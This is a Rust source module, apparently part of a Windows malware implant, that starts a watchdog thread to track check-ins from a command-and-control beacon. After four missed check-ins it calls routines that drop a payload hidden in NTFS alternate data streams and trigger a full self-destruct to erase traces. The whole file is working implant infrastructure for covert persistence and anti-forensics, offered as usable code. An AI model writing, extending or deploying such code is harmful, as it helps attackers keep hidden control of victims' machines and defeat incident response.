//! watchdog.rs — Heartbeat monitor + recovery thread
//!
//! Spawns a dedicated OS thread that:
//!   1. Sleeps for TICK_MS milliseconds
//!   2. Checks that the main beacon thread is still alive
//!   3. On failure: drops ADS, triggers full self-destruct

#![allow(dead_code, non_snake_case)]

use winapi::um::processthreadsapi::{
    CreateThread, GetCurrentProcessId,
};
use winapi::um::handleapi::CloseHandle;
use winapi::um::winnt::{
    HANDLE, PAGE_READONLY,
    FILE_ATTRIBUTE_NORMAL,
};
use winapi::um::synchapi::Sleep;
use winapi::shared::minwindef::DWORD;
use core::ptr::null_mut;

const TICK_MS:      u32 = 30_000;  // check every 30 s
const MAX_MISSES:   u32 = 4;       // 4 missed ticks → 2 min dead

static mut MISS_COUNT: u32 = 0;

/// Called by C2 beacon loop on every successful checkin to reset the miss counter.
pub fn reset() {
    unsafe { MISS_COUNT = 0; }
}

unsafe extern "system" fn watchdog_thread(_: *mut core::ffi::c_void) -> DWORD {
    loop {
        Sleep(TICK_MS);
        MISS_COUNT += 1;
        if MISS_COUNT >= MAX_MISSES {
            // Beacon appears dead — clean up and terminate
            crate::resurrect::drop_from_ads();
            crate::selfdestruct::full_destruct();
        }
    }
}

/// Launch the watchdog thread. Call once from main after beacon loop is set up.
pub fn start(sleep_key: &[u8; 16]) {
    let _ = sleep_key;
    unsafe {
        let h = CreateThread(
            null_mut(),
            0,
            Some(watchdog_thread),
            null_mut(),
            0,
            null_mut(),
        );
        if !h.is_null() { CloseHandle(h); }
    }
}
